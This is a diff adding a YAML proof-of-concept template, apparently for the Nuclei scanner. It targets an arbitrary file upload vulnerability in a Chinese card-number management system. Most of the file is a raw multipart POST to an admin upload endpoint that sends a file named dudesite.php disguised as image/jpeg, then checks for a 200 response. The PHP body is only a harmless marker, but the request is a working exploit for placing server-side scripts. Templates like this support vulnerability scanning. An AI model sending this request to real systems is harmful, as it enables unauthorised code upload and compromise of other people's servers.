@@ -1,0 +1,87 @@
+id: poc-hs6v260vwm4utx16
+info:
+  name: 卡号极团管理系统任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hs6v260vwm4utx16'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hs6v260vwm4utx16
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03
+
+
+    Accept: */*
+
+
+    Sec-Fetch-Site: same-origin
+
+
+    Sec-Fetch-Mode: cors
+
+
+    Sec-Fetch-Dest: empty
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+
+
+    ------WebKitFormBoundarylkv1kpsZgzw2WC03
+
+
+    Content-Disposition: form-data; name="name"
+
+
+
+
+    dudesite.php
+
+
+
+
+    ------WebKitFormBoundarylkv1kpsZgzw2WC03
+
+
+    Content-Disposition: form-data; name="upfile"; filename="dudesite.php"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    dudesuite
+
+
+    ------WebKitFormBoundarylkv1kpsZgzw2WC03--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    SUCCESS
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
